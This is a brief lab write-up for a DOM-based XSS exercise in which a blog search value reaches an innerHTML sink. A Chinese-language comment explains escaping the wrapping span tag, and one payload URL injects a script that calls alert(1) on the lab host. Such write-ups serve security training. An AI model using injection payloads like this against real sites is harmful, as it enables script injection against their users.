# Lab: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

## Cross Site Scripting 
* 題目說在 search 有問題，稍微觀察一下可以看到搜尋的字串用 `<span>` 包起來，所以跳脫就可以過關了
```
payload = https://aca11f3e1f198705c09d7f2e006a0001.web-security-academy.net/?search=%3C%2Fspan%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```